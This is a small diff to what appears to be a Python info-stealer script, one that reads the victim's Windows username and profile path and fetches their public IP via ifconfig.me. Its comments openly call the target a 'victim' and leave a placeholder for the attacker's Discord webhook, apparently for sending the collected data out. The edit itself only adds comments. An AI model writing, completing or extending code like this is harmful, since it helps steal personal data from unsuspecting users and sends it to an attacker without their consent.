@@ -3,8 +3,8 @@ from discord_webhook import DiscordWebhook
 import requests
 import os
 
-username = os.environ["USERNAME"] #username of pc
-userprofile = os.environ["USERPROFILE"] #path file > C:\Users\{username}
+username = os.environ["USERNAME"] #username of pc (you can use in file variabiles)
+userprofile = os.environ["USERPROFILE"] #path file > C:\Users\{username} (you can use in file variabiles)
 
 i = requests.get("https://ifconfig.me") #get victim public ip
 weburl = 'ENTER HERE YOUR WEBHOOK' #enter here your discord webhook url
